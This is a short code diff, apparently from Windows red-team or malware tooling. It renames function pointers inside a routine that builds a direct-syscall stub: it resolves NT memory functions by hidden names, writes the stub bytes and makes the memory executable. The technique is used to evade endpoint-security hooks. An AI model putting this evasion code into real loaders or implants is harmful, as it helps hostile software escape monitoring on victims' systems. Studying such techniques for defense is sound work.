@@ -39,18 +39,18 @@ static DWORD ResolveSSN(const char *name) {
 
 /* ================= Direct syscall core ================= */
 static void *BuildDirectSyscallStub(DWORD ssn) {
-    NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-    NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+    NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+    NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
 
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
 
-    NtAllocateVirtualMemory = (void *)myGetProcAddress(ntdll, ntallocvm);
-    NtProtectVirtualMemory = (void *)myGetProcAddress(ntdll, ntprotectvm);
+    pNtAllocateVirtualMemory = (void *)myGetProcAddress(ntdll, ntallocvm);
+    pNtProtectVirtualMemory = (void *)myGetProcAddress(ntdll, ntprotectvm);
 
     PVOID  base = NULL;
     SIZE_T size = 11;
 
-    NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    pNtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     unsigned char *p = (unsigned char *)base;
 
@@ -64,7 +64,7 @@ static void *BuildDirectSyscallStub(DWORD ssn) {
     p[10] = 0xC3; // ret 
 
     ULONG oldProt;
-    NtProtectVirtualMemory((HANDLE)-1, &base, &size, PAGE_EXECUTE_READ, &oldProt);
+    pNtProtectVirtualMemory((HANDLE)-1, &base, &size, PAGE_EXECUTE_READ, &oldProt);
 
     return base;
 }
